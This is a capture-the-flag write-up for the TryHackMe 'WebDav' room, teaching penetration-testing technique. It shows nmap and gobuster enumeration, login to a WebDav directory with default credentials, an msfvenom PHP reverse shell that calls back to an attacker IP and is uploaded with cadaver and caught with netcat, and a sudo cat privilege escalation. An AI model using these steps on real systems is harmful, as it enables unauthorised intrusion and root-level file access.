# TryHackMe – WebDav Write-up

## Overview
- Room: WebDav  
- Difficulty: Easy  
- Tags: Enumeration, Web, Exploitation, Privilege Escalation  

---

## Enumeration

### Nmap Scan
Run a basic nmap scan:

```bash
sudo nmap -sC -sV -Pn -p- xxx.xxx.xxx.xxx
```


**Results:**
```
Nmap scan report for xxx.xxx.xxx.xxx
Host is up (0.093s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Port 80 is running Apache 2.4.18 (Ubuntu).

---

## Web Enumeration

When visiting the site, we see the default Apache2 page.

### Gobuster
Run directory brute force:

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://xxx.xxx.xxx.xxx/
```

**Results:**
```
/.hta                 (Status: 403)
/.htpasswd            (Status: 403)
/.htaccess            (Status: 403)
/index.html           (Status: 200)
/server-status        (Status: 403)
/webdav               (Status: 401)
```

We discover a directory **/webdav** that requires authentication.

---

## Exploitation

We use default WebDav credentials found in public sources. After login, we gain the ability to upload files.

### Creating reverse shell
Generate a payload using `msfvenom`:

```bash
msfvenom -p php/reverse_php LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f raw -o shell.php
```

- `-p php/reverse_php` – PHP reverse shell payload  
- `LHOST` – attacker IP  
- `LPORT` – listener port  
- `-f raw` – save as plain PHP file  
- `-o shell.php` – output filename  

### Upload reverse shell
Use **cadaver** to upload the PHP reverse shell:

```bash
cadaver http://xxx.xxx.xxx.xxx/webdav
put shell.php
```

Set up a listener:

```bash
nc -lvnp 4444
```

After opening `shell.php` in the browser, we get a reverse shell.

### Shell stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

Check sudo rights:

```bash
sudo -l
```

**Result:**
```
User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

We can run `cat` as root without password.

Read the root flag:

```bash
sudo cat /root/root.txt
```

---

## Flags
- root.txt: obtained using `sudo cat`

---

## Conclusion
We successfully:
1. Performed nmap scan and found the web server.  
2. Discovered a protected directory /webdav with gobuster.  
3. Used default WebDav credentials.  
4. Generated a PHP reverse shell with msfvenom and uploaded it using cadaver.  
5. Got a reverse shell and stabilized it.  
6. Escalated privileges using `sudo cat`.  

A simple but clear example of exploiting misconfigured WebDav and sudo rights.
